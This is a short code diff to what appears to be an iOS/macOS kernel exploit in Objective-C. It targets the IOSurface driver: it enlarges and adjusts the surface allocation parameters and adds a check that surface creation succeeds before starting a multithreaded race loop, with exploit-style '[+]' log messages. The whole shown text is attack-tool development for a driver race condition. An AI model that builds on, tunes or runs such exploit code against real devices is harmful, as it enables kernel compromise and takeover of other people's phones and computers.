@@ -85,11 +85,12 @@ static io_connect_t open_iosurface(void) {
 
 static IOSurfaceRef create_surface_ref(uint32_t *out_sid) {
     NSDictionary *props = @{
-        (id)kIOSurfaceAllocSize: @(4096),
+        (id)kIOSurfaceAllocSize: @(16384),
         (id)kIOSurfaceWidth: @(64),
         (id)kIOSurfaceHeight: @(64),
+        (id)kIOSurfaceBytesPerRow: @(256),
         (id)kIOSurfaceBytesPerElement: @(4),
-        (id)kIOSurfacePixelFormat: @(0x42475241)
+        (id)kIOSurfacePixelFormat: @(0x42475241) // 'BGRA'
     };
     IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
     if (surf) {
@@ -260,6 +261,16 @@ static void *thread_locker(void *arg) {
         return;
     }
     appendLog([NSString stringWithFormat:@"[+] Driver handle: 0x%x", g_connection]);
+
+    uint32_t test_sid = 0;
+    IOSurfaceRef test_surf = create_surface_ref(&test_sid);
+    if (!test_surf || test_sid == 0) {
+        appendLog(@"[-] Surface creation failed! Allocator rejected parameters.");
+        IOServiceClose(g_connection);
+        return;
+    }
+    appendLog([NSString stringWithFormat:@"[+] Surface allocator verified: test surface ID %u", test_sid]);
+    CFRelease(test_surf);
 
     atomic_store(&g_running, true);
     atomic_store(&g_race_iterations, 0);
